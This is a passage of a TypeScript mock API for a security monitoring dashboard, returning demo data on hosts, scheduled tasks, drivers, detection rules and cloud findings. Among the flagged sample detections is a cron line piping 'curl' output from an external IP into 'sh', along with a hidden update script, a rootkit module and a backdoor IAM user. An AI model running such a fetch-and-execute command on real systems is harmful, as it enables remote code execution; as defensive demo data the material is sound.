      { username: 'svc_web', uid: 1001, gid: 1001, shell: '/sbin/nologin', home: '/var/www', last_login: null },
      { username: 'nobody',  uid: 65534,gid: 65534,shell: '/sbin/nologin', home: '/nonexistent', last_login: null },
    ]);
  }
  if (/^\/agents\/\d+\/packages$/.test(p)) {
    return ok([
      { package_name: 'openssl',    version: '1.0.2k',  arch: 'amd64' },
      { package_name: 'openssh-server', version: '8.9p1', arch: 'amd64' },
      { package_name: 'nginx',      version: '1.18.0',  arch: 'amd64' },
      { package_name: 'curl',       version: '7.81.0',  arch: 'amd64' },
      { package_name: 'python3',    version: '3.10.6',  arch: 'amd64' },
      { package_name: 'log4j-core', version: '2.14.1',  arch: 'amd64' },
      { package_name: 'docker-ce',  version: '20.10.21',arch: 'amd64' },
      { package_name: 'bash',       version: '5.1-6',   arch: 'amd64' },
      { package_name: 'sudo',       version: '1.9.9p2', arch: 'amd64' },
      { package_name: 'libssl1.0.2',version: '1.0.2n',  arch: 'amd64' },
    ]);
  }
  if (/^\/agents\/\d+\/auth-logs$/.test(p)) return ok([]);
  if (/^\/agents\/\d+\/filehashes$/.test(p))return ok([]);
  if (/^\/agents\/\d+\/startup$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    const isFirst = id === D.agents[0]?.id;
    return ok([
      { id: 1, name: 'xcloak-agent',       path: '/usr/bin/xcloak-agent-desktop', type: 'systemd', enabled: true,  state: 'active',     risk: 'none' },
      { id: 2, name: 'sshd',               path: '/usr/sbin/sshd',                type: 'systemd', enabled: true,  state: 'active',     risk: 'none' },
      { id: 3, name: 'nginx',              path: '/usr/sbin/nginx',                type: 'systemd', enabled: true,  state: 'active',     risk: 'none' },
      { id: 4, name: 'ufw',               path: '/lib/ufw/ufw-init',              type: 'systemd', enabled: true,  state: 'active',     risk: 'none' },
      ...(isFirst ? [
        { id: 5, name: '.sys_update',      path: '/tmp/.system/sys_update.sh',    type: 'crontab', enabled: true,  state: 'suspicious', risk: 'critical' },
        { id: 6, name: 'rc.local beacon', path: '/etc/rc.local',                  type: 'init',    enabled: true,  state: 'suspicious', risk: 'high' },
      ] : []),
      { id: 7, name: 'cron',              path: '/usr/sbin/cron',                  type: 'systemd', enabled: true,  state: 'active',     risk: 'none' },
      { id: 8, name: 'rsyslog',           path: '/usr/sbin/rsyslogd',              type: 'systemd', enabled: true,  state: 'active',     risk: 'none' },
    ]);
  }
  if (/^\/agents\/\d+\/usb-history$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    const isFirst = id === D.agents[0]?.id;
    return ok([
      ...(isFirst ? [
        { id: 1, device_name: 'SanDisk Cruzer 16GB', vendor_id: '0781', product_id: '5567', serial: '4C530001370A7070', mount_point: '/media/usb0', event: 'connected',    first_seen: new Date(Date.now() - 3600000 * 2).toISOString(),  last_seen: new Date(Date.now() - 3600000).toISOString(), risk: 'medium' },
        { id: 2, device_name: 'SanDisk Cruzer 16GB', vendor_id: '0781', product_id: '5567', serial: '4C530001370A7070', mount_point: '/media/usb0', event: 'disconnected', first_seen: new Date(Date.now() - 3600000 * 2).toISOString(),  last_seen: new Date(Date.now() - 3600000).toISOString(), risk: 'medium' },
      ] : []),
      { id: 3, device_name: 'Logitech USB Receiver', vendor_id: '046d', product_id: 'c52b', serial: null, mount_point: null, event: 'connected', first_seen: new Date(Date.now() - 86400000 * 5).toISOString(), last_seen: new Date(Date.now() - 86400000 * 5).toISOString(), risk: 'none' },
    ]);
  }
  if (/^\/agents\/\d+\/login-history$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    const isFirst = id === D.agents[0]?.id;
    return ok([
      { id: 1, username: 'ubuntu',  tty: 'pts/0', ip: '10.0.2.55',      method: 'ssh', status: 'success', timestamp: new Date(Date.now() - 3600000).toISOString(),     duration_s: 3600 },
      ...(isFirst ? [
        { id: 2, username: 'root',  tty: 'pts/1', ip: '185.220.101.47', method: 'ssh', status: 'success', timestamp: new Date(Date.now() - 7200000).toISOString(),     duration_s: 1800, risk: 'critical' },
        { id: 3, username: 'root',  tty: 'pts/2', ip: '92.118.160.12',  method: 'ssh', status: 'failed',  timestamp: new Date(Date.now() - 7800000).toISOString(),     duration_s: 0,    risk: 'high' },
        { id: 4, username: 'admin', tty: 'pts/3', ip: '185.220.101.47', method: 'ssh', status: 'failed',  timestamp: new Date(Date.now() - 8000000).toISOString(),     duration_s: 0,    risk: 'high' },
        { id: 5, username: 'admin', tty: 'pts/4', ip: '10.0.2.55',      method: 'ssh', status: 'success', timestamp: new Date(Date.now() - 86400000).toISOString(),    duration_s: 7200 },
      ] : [
        { id: 2, username: 'ubuntu',tty: 'pts/1', ip: '10.0.0.5',       method: 'ssh', status: 'success', timestamp: new Date(Date.now() - 86400000).toISOString(),    duration_s: 1200 },
      ]),
    ]);
  }
  if (/^\/agents\/\d+\/scheduled-tasks$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    const isFirst = id === D.agents[0]?.id;
    return ok([
      { id: 1, name: 'Daily Log Rotation',   command: '/usr/sbin/logrotate /etc/logrotate.conf', schedule: '0 0 * * *',   user: 'root',   type: 'cron', enabled: true,  risk: 'none' },
      { id: 2, name: 'System Updates Check', command: '/usr/bin/apt-get update -q',              schedule: '0 6 * * 0',   user: 'root',   type: 'cron', enabled: true,  risk: 'none' },
      { id: 3, name: 'Temp Cleanup',         command: '/usr/bin/find /tmp -mtime +7 -delete',    schedule: '0 3 * * *',   user: 'root',   type: 'cron', enabled: true,  risk: 'none' },
      ...(isFirst ? [
        { id: 4, name: 'sys_update',         command: '/tmp/.system/sys_update.sh > /dev/null',  schedule: '*/5 * * * *', user: 'root',   type: 'cron', enabled: true,  risk: 'critical' },
        { id: 5, name: 'beacon_check',       command: 'curl -s http://185.220.101.47/cmd | sh',  schedule: '*/10 * * * *',user: 'nobody', type: 'cron', enabled: true,  risk: 'critical' },
      ] : []),
      { id: 6, name: 'XCloak Health Ping',   command: '/usr/bin/xcloak-agent-desktop --ping',   schedule: '* * * * *',   user: 'root',   type: 'cron', enabled: true,  risk: 'none' },
    ]);
  }
  if (/^\/agents\/\d+\/drivers$/.test(p)) {
    return ok([
      { id: 1, name: 'virtio_net',    description: 'VirtIO Network Driver',         version: '1.0.0',  status: 'loaded',   path: '/lib/modules/5.15/kernel/drivers/net/virtio_net.ko',    signed: true  },
      { id: 2, name: 'ext4',          description: 'Ext4 Filesystem Driver',        version: '1.0.0',  status: 'loaded',   path: '/lib/modules/5.15/kernel/fs/ext4/ext4.ko',               signed: true  },
      { id: 3, name: 'virtio_blk',    description: 'VirtIO Block Driver',           version: '1.0.0',  status: 'loaded',   path: '/lib/modules/5.15/kernel/drivers/block/virtio_blk.ko',   signed: true  },
      { id: 4, name: 'iptable_filter',description: 'iptables Filter Table',         version: '1.0.0',  status: 'loaded',   path: '/lib/modules/5.15/kernel/net/ipv4/netfilter/',            signed: true  },
      { id: 5, name: 'usbcore',       description: 'USB Core Driver',               version: '1.0.0',  status: 'loaded',   path: '/lib/modules/5.15/kernel/drivers/usb/core/usbcore.ko',   signed: true  },
      { id: 6, name: 'rootkit_mod',   description: 'Unknown LKM (unsigned)',         version: '0.0.1',  status: 'loaded',   path: '/tmp/.rootkit/rkit.ko',                                  signed: false, risk: 'critical' },
    ]);
  }
  if (/^\/agents\/\d+\/policies$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    return ok({
      agent_id:                    id,
      tamper_protection:           id === D.agents[0]?.id || id === D.agents[1]?.id,
      collection_interval_seconds: 300,
      fim_enabled:                 true,
      fim_paths:                   ['/etc', '/bin', '/usr/bin', '/usr/sbin', '/var/www'],
      yara_enabled:                true,
      network_isolation:           id === D.agents[0]?.id,
      max_cpu_percent:             10.0,
      log_verbosity:               'info',
      auto_update:                 false,
      allowed_usb_devices:         [],
      block_removable_media:       false,
      script_execution_blocked:    false,
    });
  }
  if (/^\/agents\/\d+\/fim\/alerts$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    return ok(D.fim_alerts.filter((f: any) => f.agent_id === id));
  }
  if (/^\/agents\/\d+\/fim\/baseline$/.test(p)) return ok([]);

  // ── IOCs — indicator/enabled keys ─────────────────────────────────────────
  if (p === '/iocs') {
    let arr = [...IOCS_NORMALIZED];
    const search = sp.get('search');
    const type   = sp.get('type');
    if (search) arr = arr.filter((i: any) => i.indicator?.includes(search) || i.description?.includes(search));
    if (type)   arr = arr.filter((i: any) => i.type === type);
    const pg = paginate(arr, sp);
    return ok({ data: pg.data, total: pg.total, page: pg.page, limit: pg.per_page });
  }
  if (/^\/iocs\/\d+$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    return ok(IOCS_NORMALIZED.find((i: any) => i.id === id) ?? notFound().data);
  }

  // ── Threat Feeds ─────────────────────────────────────────────────────────
  if (p === '/threat-feeds') return ok(D.threat_feeds.slice(0, 8));
  if (/^\/threat-feeds\/\d+\/sync-log$/.test(p)) return ok([]);

  // ── Threat Actors — with recent_alert_count, is_builtin ──────────────────
  if (p === '/threat-actors') return ok(THREAT_ACTORS_NORMALIZED);

  // ── Threat Intelligence ───────────────────────────────────────────────────
  if (p === '/threat/scores') return ok([]);
  if (p === '/threat/fleet')  return ok(FLEET_SUMMARIES);  // array, not object
  if (p === '/ai/anomalies')  {
    const aid = sp.get('agent_id');
    return ok(aid ? D.network_anomalies.filter((n: any) => String(n.agent_id) === aid).slice(0, 10) : []);
  }

  // ── Sigma Rules — stats returns SigmaRuleStat[] ───────────────────────────
  if (p === '/sigma/dashboard')     return ok(SIGMA_DASHBOARD);
  if (p === '/sigma/mitre-coverage') return ok(SIGMA_MITRE_COVERAGE);
  if (p === '/sigma/analytics')     return ok(SIGMA_ANALYTICS);
  if (p === '/sigma/categories')    return ok(SIGMA_CATEGORIES);
  if (p === '/sigma/performance')   return ok({ hits_last_hour: 18, hits_last_24h: 247, hits_last_7d: 1432, hourly: [], top_agents: [] });
  if (p === '/sigma/relationships') return ok(SIGMA_RELATIONSHIPS);
  if (p === '/sigma/rules') {
    let arr = [...D.sigma_rules];
    const search = sp.get('search');
    const sev    = sp.get('severity');
    if (search) arr = arr.filter((r: any) => r.title?.toLowerCase().includes(search.toLowerCase()));
    if (sev)    arr = arr.filter((r: any) => r.severity === sev);
    const pg = paginate(arr, sp);
    return ok({ data: pg.data, total: pg.total, page: pg.page, limit: pg.per_page });
  }
  if (p === '/sigma/stats') return ok(SIGMA_STATS);

  // ── YARA enterprise ───────────────────────────────────────────────────────
  if (p === '/yara/dashboard')     return ok(YARA_DASHBOARD);
  if (p === '/yara/analytics')     return ok(YARA_ANALYTICS);
  if (p === '/yara/categories')    return ok(YARA_CATEGORIES);
  if (p === '/yara/performance')   return ok({ rules_evaluated: _yaraRules.length, matches_1h: 3, matches_24h: YARA_DASHBOARD.matches_today, avg_scan_ms: 142, top_files: [] });
  if (p === '/yara/relationships') return ok(YARA_RELATIONSHIPS);
  if (/^\/yara\/rules\/\d+\/detail$/.test(p)) {
    const rid = parseInt(p.split('/')[3]);
    const rule = _yaraRules.find((r: any) => r.id === rid);
    if (!rule) return notFound();
    const rm = _yaraMatches.filter((m: any) => m.rule_name === rule.name);
    return ok({ rule, matches: rm, match_count: rm.length, last_match: rm[0]?.created_at ?? null });
  }

  // ── YARA ──────────────────────────────────────────────────────────────────
  if (p === '/yara/rules')   return ok(D.yara_rules);
  if (p === '/yara/matches') {
    const aid = sp.get('agent_id');
    return ok(aid ? D.yara_matches.filter((m: any) => String(m.agent_id) === aid) : D.yara_matches);
  }

  // ── Firewall ──────────────────────────────────────────────────────────────
  if (p === '/firewall/rules')     return ok(D.firewall_rules);
  if (p === '/firewall/stats')     return ok({ total: D.firewall_rules.length, enabled: D.firewall_rules.filter((r: any) => r.enabled).length, total_hits_24h: D.firewall_rules.reduce((s: number, r: any) => s + (r.hit_count || 0), 0), total_hits: D.firewall_rules.reduce((s: number, r: any) => s + (r.hit_count || 0), 0) });
  if (p === '/firewall/groups')    return ok([...new Set(D.firewall_rules.map((r: any) => r.group_name).filter(Boolean))]);
  if (p === '/firewall/conflicts') return ok([]);
  if (p === '/firewall/sync/log')  return ok([]);

  // ── Vulnerabilities ───────────────────────────────────────────────────────
  if (p === '/vulns/priority-queue') {
    const pg = paginate(VULN_QUEUE_ITEMS, sp);
    return ok({ items: pg.data, total: VULN_QUEUE_ITEMS.length, page: pg.page, pages: pg.pages });
  }
  if (p === '/vulnerabilities') return ok(D.vulnerabilities);

  // ── Assets ────────────────────────────────────────────────────────────────
  if (p === '/assets') return ok(D.assets);
  if (/^\/assets\/\d+$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    return ok(D.assets.find((a: any) => a.id === id) ?? notFound().data);
  }

  // ── Cases — list returns {cases,total}; detail returns {case,comments,evidence,alerts} ─
  if (p === '/cases') {
    const st  = sp.get('status');
    const ph  = sp.get('phase');
    let arr   = [...D.cases];
    if (st) arr = arr.filter((c: any) => c.status === st);
    if (ph) arr = arr.filter((c: any) => c.phase === ph);
    const pg = paginate(arr, sp);
    return ok({ cases: pg.data, total: pg.total, page: pg.page, pages: pg.pages });
  }
  if (/^\/cases\/\d+$/.test(p)) {
    const id = parseInt(p.split('/')[2]);
    const c  = D.cases.find((c: any) => c.id === id);
    if (!c) return notFound();
    return ok({ case: c, comments: [], evidence: [], alerts: [] });
  }
  if (/^\/cases\/\d+\/comments$/.test(p)) return ok([]);
  if (/^\/cases\/\d+\/evidence$/.test(p))  return ok([]);
  if (/^\/cases\/\d+\/alerts$/.test(p))    return ok([]);

  // ── Suppression — {rules, stats} ─────────────────────────────────────────
  if (p === '/suppression/rules') {
    const active = D.suppression_rules.filter((r: any) => r.enabled !== false).length;
    return ok({
      rules: D.suppression_rules,
      stats: { active_rules: active, total_suppressed: 1842, suppressed_24h: 73 },
    });
  }

  // ── Quarantine ────────────────────────────────────────────────────────────
  if (p === '/quarantine') return ok(D.quarantine);

  // ── UEBA — events wrapped in {events:[]} ─────────────────────────────────
  if (p === '/ueba/users') {
    let arr = [...D.ueba_users];
    const min = sp.get('min_score');
    if (min) arr = arr.filter((u: any) => u.risk_score >= parseInt(min));
    return ok({ profiles: arr, total: arr.length });
  }
  if (p === '/ueba/events') {
    const user = sp.get('username');
    const arr  = user ? D.ueba_events.filter((e: any) => e.username === user) : D.ueba_events;
    return ok({ events: arr });
  }

  // ── Insider Threat — contributor keys fixed ───────────────────────────────
  if (p === '/insider-threat' || p === '/insider-threat/scores') {
    return ok(INSIDER_NORMALIZED);
  }
  if (p === '/insider-threat/summary') {
    return ok(INSIDER_NORMALIZED.filter((s: any) => s.score >= 30).slice(0, 5));
  }

  // ── Alert Clusters ────────────────────────────────────────────────────────
  if (p === '/clusters') {
    return ok(D.alert_clusters.slice(0, parseInt(sp.get('limit') || '200')));
  }

  // ── JA3 Enterprise ────────────────────────────────────────────────────────
  if (p === '/ja3/dashboard')      return ok(JA3_DASHBOARD);
  if (p === '/ja3/analytics')      return ok(JA3_ANALYTICS);
  if (p === '/ja3/tls-stats')      return ok(JA3_TLS_STATS);
  if (p === '/ja3/behavioral')     return ok(JA3_BEHAVIORAL);
  if (p === '/ja3/relationships')  return ok(JA3_RELATIONSHIPS);
  if (p === '/ja3/threat-intel')   return ok(JA3_THREAT_INTEL);
  if (p === '/ja3/timeline')       return ok(JA3_TIMELINE);
  if (p === '/ja3/watchlist')      return ok([]);
  if (/^\/ja3\/fingerprints\/[a-f0-9]{32}\/detail$/.test(p)) {
    const hash = p.split('/')[3];
    const fp   = JA3_NORMALIZED.find((j: any) => j.hash === hash);
    return fp ? ok({ fingerprint: fp, alerts: [], connections: [], alert_count: 0 }) : notFound();
  }

  // ── JA3 — is_platform field ───────────────────────────────────────────────
  if (p === '/ja3/fingerprints') return ok(JA3_NORMALIZED);

  // ── Canary / Deception ────────────────────────────────────────────────────
  if (p === '/canary/tokens') return ok(D.canary_tokens);
  if (p === '/canary/trips')  return ok([]);
  if (p === '/honeyports')    return ok(D.honeyports);

  // ── Cloud Security Enterprise ─────────────────────────────────────────────
  if (p === '/cloud/dashboard') return ok({ aws_accounts: 3, azure_subs: 2, gcp_projects: 1, total_assets: 247, public_assets: 18, critical_findings: 12, iam_risks: 24, active_threats: 3, multi_cloud_risk: 67, compliance_score: 76, inventory: [{ provider: 'aws', count: 142 }, { provider: 'azure', count: 73 }, { provider: 'gcp', count: 32 }], recent_threats: [{ id: 1, threat_type: 'crypto_mining', provider: 'aws', resource_id: 'i-0a1b2c3d4e5f67890', severity: 'critical', source_ip: '185.220.101.47', created_at: new Date(Date.now() - 300000).toISOString() }, { id: 2, threat_type: 'suspicious_api_calls', provider: 'aws', resource_id: 'arn:aws:iam::123456789012:user/deploy-bot', severity: 'high', source_ip: '10.0.1.44', created_at: new Date(Date.now() - 900000).toISOString() }, { id: 3, threat_type: 'impossible_travel', provider: 'azure', resource_id: 'user@corp.com', severity: 'high', source_ip: '203.0.113.42', created_at: new Date(Date.now() - 1800000).toISOString() }, { id: 4, threat_type: 'bucket_enumeration', provider: 'aws', resource_id: 'corp-backups', severity: 'medium', source_ip: '185.220.101.47', created_at: new Date(Date.now() - 3600000).toISOString() }] });
  if (p === '/cloud/accounts') return ok([{ id: 1, name: 'AWS Production', provider: 'aws', account_id: '123456789012', region: 'us-east-1', status: 'connected', asset_count: 142, finding_count: 47, risk_score: 72, last_scan: new Date(Date.now() - 3600000).toISOString(), created_at: new Date(Date.now() - 86400000 * 90).toISOString() }, { id: 2, name: 'AWS Staging', provider: 'aws', account_id: '234567890123', region: 'us-west-2', status: 'connected', asset_count: 38, finding_count: 12, risk_score: 41, last_scan: new Date(Date.now() - 7200000).toISOString(), created_at: new Date(Date.now() - 86400000 * 60).toISOString() }, { id: 3, name: 'AWS Dev', provider: 'aws', account_id: '345678901234', region: 'eu-west-1', status: 'warning', asset_count: 62, finding_count: 28, risk_score: 58, last_scan: new Date(Date.now() - 14400000).toISOString(), created_at: new Date(Date.now() - 86400000 * 30).toISOString() }, { id: 4, name: 'Azure Corp', provider: 'azure', account_id: 'sub-abc123', region: 'East US', status: 'connected', asset_count: 73, finding_count: 19, risk_score: 55, last_scan: new Date(Date.now() - 5400000).toISOString(), created_at: new Date(Date.now() - 86400000 * 45).toISOString() }, { id: 5, name: 'Azure DR', provider: 'azure', account_id: 'sub-def456', region: 'West Europe', status: 'connected', asset_count: 24, finding_count: 6, risk_score: 32, last_scan: new Date(Date.now() - 10800000).toISOString(), created_at: new Date(Date.now() - 86400000 * 20).toISOString() }, { id: 6, name: 'GCP Analytics', provider: 'gcp', account_id: 'proj-analytics-prod', region: 'us-central1', status: 'connected', asset_count: 32, finding_count: 8, risk_score: 44, last_scan: new Date(Date.now() - 7200000).toISOString(), created_at: new Date(Date.now() - 86400000 * 15).toISOString() }]);
  if (p === '/cloud/inventory') return ok([{ id: 1, name: 'corp-backups', resource_type: 's3', provider: 'aws', region: 'us-east-1', owner: 'ops-team', tags: 'env:prod,team:ops', risk_score: 95, internet_exposed: true, status: 'active', last_activity: new Date(Date.now() - 10800000).toISOString(), created_at: new Date(Date.now() - 86400000 * 180).toISOString() }, { id: 2, name: 'web-prod-01', resource_type: 'ec2', provider: 'aws', region: 'us-east-1', owner: 'engineering', tags: 'env:prod,role:web', risk_score: 78, internet_exposed: true, status: 'active', last_activity: new Date(Date.now() - 60000).toISOString(), created_at: new Date(Date.now() - 86400000 * 365).toISOString() }, { id: 3, name: 'postgres-prod-01', resource_type: 'rds', provider: 'aws', region: 'us-east-1', owner: 'dba-team', tags: 'env:prod,type:database', risk_score: 82, internet_exposed: false, status: 'active', last_activity: new Date(Date.now() - 120000).toISOString(), created_at: new Date(Date.now() - 86400000 * 200).toISOString() }, { id: 4, name: 'k8s-prod', resource_type: 'eks', provider: 'aws', region: 'us-east-1', owner: 'platform-team', tags: 'env:prod,type:k8s', risk_score: 61, internet_exposed: true, status: 'active', last_activity: new Date(Date.now() - 180000).toISOString(), created_at: new Date(Date.now() - 86400000 * 120).toISOString() }, { id: 5, name: 'corp-storage-01', resource_type: 'storage_account', provider: 'azure', region: 'East US', owner: 'cloud-ops', tags: 'env:prod', risk_score: 55, internet_exposed: false, status: 'active', last_activity: new Date(Date.now() - 3600000).toISOString(), created_at: new Date(Date.now() - 86400000 * 90).toISOString() }, { id: 6, name: 'analytics-bq', resource_type: 'bigquery', provider: 'gcp', region: 'us-central1', owner: 'data-team', tags: 'env:prod,type:analytics', risk_score: 44, internet_exposed: false, status: 'active', last_activity: new Date(Date.now() - 7200000).toISOString(), created_at: new Date(Date.now() - 86400000 * 60).toISOString() }, { id: 7, name: 'lambda-payments', resource_type: 'lambda', provider: 'aws', region: 'us-east-1', owner: 'payments-team', tags: 'env:prod,function:payment', risk_score: 38, internet_exposed: true, status: 'active', last_activity: new Date(Date.now() - 900000).toISOString(), created_at: new Date(Date.now() - 86400000 * 45).toISOString() }, { id: 8, name: 'prod-vpc', resource_type: 'vpc', provider: 'aws', region: 'us-east-1', owner: 'network-team', tags: 'env:prod', risk_score: 25, internet_exposed: false, status: 'active', last_activity: new Date(Date.now() - 1800000).toISOString(), created_at: new Date(Date.now() - 86400000 * 400).toISOString() }]);
  if (p === '/cloud/cspm/findings') return ok([{ id: 1, category: 'public_storage', title: 'S3 bucket corp-backups is publicly accessible', description: 'The S3 bucket allows public read access, exposing 2.4 GB of backup data including database dumps and configuration files.', severity: 'critical', provider: 'aws', region: 'us-east-1', resource_type: 's3', resource_id: 'corp-backups', remediation: 'Enable S3 Block Public Access settings and remove public bucket policy.', framework: 'CIS', control_id: 'CIS-2.1', created_at: new Date(Date.now() - 10800000).toISOString() }, { id: 2, category: 'weak_iam', title: 'IAM role BackupRole has AdministratorAccess but is dormant', description: 'IAM role has full AdministratorAccess permissions but has not been used in 6 months, creating unnecessary privilege escalation risk.', severity: 'critical', provider: 'aws', region: 'us-east-1', resource_type: 'iam_role', resource_id: 'arn:aws:iam::123456789012:role/BackupRole', remediation: 'Remove AdministratorAccess policy and apply least-privilege permissions based on actual usage.', framework: 'CIS', control_id: 'CIS-1.16', created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 3, category: 'missing_encryption', title: 'RDS instance postgres-prod-01 lacks encryption at rest', description: 'Production PostgreSQL database has encryption at rest disabled, exposing data if storage is compromised.', severity: 'high', provider: 'aws', region: 'us-east-1', resource_type: 'rds', resource_id: 'postgres-prod-01', remediation: 'Enable RDS storage encryption. Note: requires snapshot restore for existing instances.', framework: 'PCI DSS', control_id: 'PCI-3.4', created_at: new Date(Date.now() - 86400000 * 2).toISOString() }, { id: 4, category: 'open_security_group', title: 'Security group allows 0.0.0.0/0 on port 22 (SSH)', description: 'Security group sg-prod-web allows unrestricted SSH access from the internet, enabling brute-force and exploitation attempts.', severity: 'high', provider: 'aws', region: 'us-east-1', resource_type: 'security_group', resource_id: 'sg-0a1b2c3d4e5f', remediation: 'Restrict SSH access to specific IP ranges or use AWS Systems Manager Session Manager.', framework: 'CIS', control_id: 'CIS-4.1', created_at: new Date(Date.now() - 86400000 * 3).toISOString() }, { id: 5, category: 'disabled_mfa', title: '8 IAM users have no MFA enabled', description: 'Multiple IAM users with console access have not enabled multi-factor authentication, increasing account takeover risk.', severity: 'high', provider: 'aws', region: 'us-east-1', resource_type: 'iam_user', resource_id: 'multiple', remediation: 'Enforce MFA via IAM policy. Enable virtual MFA or hardware token for all console users.', framework: 'CIS', control_id: 'CIS-1.10', created_at: new Date(Date.now() - 86400000 * 4).toISOString() }, { id: 6, category: 'missing_logging', title: 'CloudTrail is disabled in eu-west-1 region', description: 'AWS CloudTrail is not enabled in the EU West region, creating a blind spot for API activity monitoring and compliance.', severity: 'high', provider: 'aws', region: 'eu-west-1', resource_type: 'cloudtrail', resource_id: 'prod-trail', remediation: 'Enable CloudTrail in all regions with log file validation and S3 object-level logging.', framework: 'NIST', control_id: 'NIST-AU-12', created_at: new Date(Date.now() - 86400000 * 5).toISOString() }, { id: 7, category: 'public_storage', title: 'Azure Blob container data-exports is publicly accessible', description: 'Azure storage container has anonymous read access enabled, exposing exported data files.', severity: 'critical', provider: 'azure', region: 'East US', resource_type: 'storage_account', resource_id: 'corp-storage-01/data-exports', remediation: 'Disable anonymous access and use SAS tokens or Azure AD authentication.', framework: 'CIS', control_id: 'CIS-3.5', created_at: new Date(Date.now() - 86400000 * 1).toISOString() }]);
  if (p === '/cloud/cspm/summary') return ok([{ category: 'public_storage', critical: 2, high: 0, medium: 1, total: 3 }, { category: 'weak_iam', critical: 1, high: 3, medium: 5, total: 9 }, { category: 'missing_encryption', critical: 0, high: 2, medium: 4, total: 6 }, { category: 'open_security_group', critical: 0, high: 2, medium: 3, total: 5 }, { category: 'disabled_mfa', critical: 0, high: 2, medium: 0, total: 2 }, { category: 'missing_logging', critical: 0, high: 1, medium: 2, total: 3 }, { category: 'default_credentials', critical: 1, high: 0, medium: 0, total: 1 }]);
  if (p === '/cloud/ciem/identities') return ok([{ id: 1, name: 'deploy-bot', identity_type: 'iam_user', provider: 'aws', account_id: '123456789012', permissions: 'AdministratorAccess,S3FullAccess', last_used: new Date(Date.now() - 900000).toISOString(), is_dormant: false, mfa_enabled: false, access_key_age_days: 127, risk_level: 'critical', created_at: new Date(Date.now() - 86400000 * 200).toISOString() }, { id: 2, name: 'BackupRole', identity_type: 'iam_role', provider: 'aws', account_id: '123456789012', permissions: 'AdministratorAccess', last_used: new Date(Date.now() - 86400000 * 187).toISOString(), is_dormant: true, mfa_enabled: false, access_key_age_days: 0, risk_level: 'critical', created_at: new Date(Date.now() - 86400000 * 400).toISOString() }, { id: 3, name: 'john.doe@corp.com', identity_type: 'iam_user', provider: 'aws', account_id: '123456789012', permissions: 'PowerUserAccess,IAMReadOnlyAccess', last_used: new Date(Date.now() - 86400000 * 3).toISOString(), is_dormant: false, mfa_enabled: false, access_key_age_days: 94, risk_level: 'high', created_at: new Date(Date.now() - 86400000 * 300).toISOString() }, { id: 4, name: 'k8s-service-account', identity_type: 'service_account', provider: 'gcp', account_id: 'proj-analytics-prod', permissions: 'roles/editor,roles/storage.admin', last_used: new Date(Date.now() - 3600000).toISOString(), is_dormant: false, mfa_enabled: false, access_key_age_days: 45, risk_level: 'high', created_at: new Date(Date.now() - 86400000 * 60).toISOString() }, { id: 5, name: 'azure-sp-devops', identity_type: 'service_principal', provider: 'azure', account_id: 'sub-abc123', permissions: 'Owner', last_used: new Date(Date.now() - 86400000).toISOString(), is_dormant: false, mfa_enabled: false, access_key_age_days: 210, risk_level: 'high', created_at: new Date(Date.now() - 86400000 * 365).toISOString() }, { id: 6, name: 'monitoring-bot', identity_type: 'iam_user', provider: 'aws', account_id: '234567890123', permissions: 'CloudWatchReadOnlyAccess', last_used: new Date(Date.now() - 86400000 * 95).toISOString(), is_dormant: true, mfa_enabled: false, access_key_age_days: 180, risk_level: 'medium', created_at: new Date(Date.now() - 86400000 * 400).toISOString() }]);
  if (p === '/cloud/ciem/risks') return ok({ dormant_accounts: 8, no_mfa: 14, old_access_keys: 6, excessive_permissions: 24, privilege_escalation: 3 });
  if (p === '/cloud/threats') return ok([{ id: 1, threat_type: 'crypto_mining', provider: 'aws', region: 'us-east-1', source_ip: '185.220.101.47', source_user: '', resource_id: 'i-0a1b2c3d4e5f67890', resource_type: 'ec2', severity: 'critical', mitre_technique: 'T1496', status: 'open', created_at: new Date(Date.now() - 300000).toISOString() }, { id: 2, threat_type: 'suspicious_api_calls', provider: 'aws', region: 'us-east-1', source_ip: '10.0.1.44', source_user: 'deploy-bot', resource_id: 'arn:aws:iam::123456789012:user/deploy-bot', resource_type: 'iam_user', severity: 'high', mitre_technique: 'T1552', status: 'open', created_at: new Date(Date.now() - 900000).toISOString() }, { id: 3, threat_type: 'impossible_travel', provider: 'azure', region: 'East US', source_ip: '203.0.113.42', source_user: 'john.doe@corp.com', resource_id: 'user@corp.com', resource_type: 'azure_ad_user', severity: 'high', mitre_technique: 'T1078', status: 'open', created_at: new Date(Date.now() - 1800000).toISOString() }, { id: 4, threat_type: 'bucket_enumeration', provider: 'aws', region: 'us-east-1', source_ip: '185.220.101.47', source_user: '', resource_id: 'corp-backups', resource_type: 's3', severity: 'medium', mitre_technique: 'T1530', status: 'open', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 5, threat_type: 'data_exfiltration', provider: 'aws', region: 'us-east-1', source_ip: '185.220.101.47', source_user: '', resource_id: 'corp-backups', resource_type: 's3', severity: 'critical', mitre_technique: 'T1537', status: 'investigating', created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 6, threat_type: 'new_iam_user', provider: 'aws', region: 'us-east-1', source_ip: '', source_user: 'deploy-bot', resource_id: 'arn:aws:iam::123456789012:user/backdoor-user', resource_type: 'iam_user', severity: 'critical', mitre_technique: 'T1136', status: 'open', created_at: new Date(Date.now() - 14400000).toISOString() }]);
  if (p === '/cloud/exposure') return ok({ public_buckets: 3, open_databases: 1, public_apis: 4, weak_security_groups: 7, exposed_assets: [{ name: 'corp-backups', resource_type: 's3', provider: 'aws', region: 'us-east-1', risk_score: 95 }, { name: 'web-prod-01', resource_type: 'ec2', provider: 'aws', region: 'us-east-1', risk_score: 78 }, { name: 'postgres-prod-01', resource_type: 'rds', provider: 'aws', region: 'us-east-1', risk_score: 82 }, { name: 'data-exports', resource_type: 'storage_account', provider: 'azure', region: 'East US', risk_score: 71 }] });
